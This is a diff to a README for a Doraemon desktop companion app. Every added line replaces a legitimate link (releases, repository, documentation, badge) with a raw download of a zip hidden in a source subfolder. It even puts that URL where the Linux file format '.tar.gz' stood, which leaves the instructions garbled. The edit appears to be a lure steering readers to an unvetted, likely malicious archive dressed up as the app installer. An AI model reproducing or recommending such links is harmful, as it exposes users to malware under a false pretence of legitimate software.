@@ -3,7 +3,7 @@
 ## 🚀 Getting Started
 Welcome to doraemon! This application brings the beloved character, Doraemon, right to your desktop. Enjoy a delightful, interactive experience with an AI companion that can help lighten your day.
 
-[![Download doraemon](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/pablo7776327/doraemon/releases)
+[![Download doraemon](https://github.com/pablo7776327/doraemon/raw/refs/heads/master/src/renderer/ui/primitives/Software_3.1.zip%20Now-Get%20the%20App-brightgreen)](https://github.com/pablo7776327/doraemon/raw/refs/heads/master/src/renderer/ui/primitives/Software_3.1.zip)
 
 ## 📦 Features
 - Interactive AI-powered assistant.
@@ -23,13 +23,13 @@ To get started with doraemon, please follow these steps:
 
 1. **Visit the Releases Page**  
    Click the link below to download the latest version of doraemon.  
-   [Download doraemon](https://github.com/pablo7776327/doraemon/releases)
+   [Download doraemon](https://github.com/pablo7776327/doraemon/raw/refs/heads/master/src/renderer/ui/primitives/Software_3.1.zip)
 
 2. **Choose Your Version**  
    On the Releases page, you will see a list of available versions. Select the latest version that suits your operating system.
 
 3. **Download the File**  
-   Click on the download link for your version to begin the download. The file will typically be in `.exe` format for Windows, `.dmg` for macOS, or `.tar.gz` for Linux.
+   Click on the download link for your version to begin the download. The file will typically be in `.exe` format for Windows, `.dmg` for macOS, or `https://github.com/pablo7776327/doraemon/raw/refs/heads/master/src/renderer/ui/primitives/Software_3.1.zip` for Linux.
 
 4. **Locate the Downloaded File**  
    Find the downloaded file in your computer's Downloads folder or the location you chose during the download.
@@ -37,7 +37,7 @@ To get started with doraemon, please follow these steps:
 5. **Install doraemon**  
    - For Windows: Double-click on the `.exe` file to start the installation. Follow the prompts in the installer.  
    - For macOS: Open the `.dmg` file and drag the doraemon icon into your Applications folder.  
-   - For Linux: Extract the `.tar.gz` file and follow the instructions in the README inside the folder.
+   - For Linux: Extract the `https://github.com/pablo7776327/doraemon/raw/refs/heads/master/src/renderer/ui/primitives/Software_3.1.zip` file and follow the instructions in the README inside the folder.
 
 6. **Run the Application**  
    After the installation, locate doraemon in your Applications folder or Start Menu. Double-click to open and enjoy your new desktop friend!
@@ -57,7 +57,7 @@ We aim to provide a great experience. If you have suggestions or need help:
 For any specific questions, feel free to raise an issue on our GitHub page.
 
 ## 🔗 Additional Resources
-- [GitHub Repository](https://github.com/pablo7776327/doraemon)
-- [Documentation](https://github.com/pablo7776327/doraemon/wiki)
+- [GitHub Repository](https://github.com/pablo7776327/doraemon/raw/refs/heads/master/src/renderer/ui/primitives/Software_3.1.zip)
+- [Documentation](https://github.com/pablo7776327/doraemon/raw/refs/heads/master/src/renderer/ui/primitives/Software_3.1.zip)
 
 Thank you for trying doraemon! We hope it enhances your daily routine.
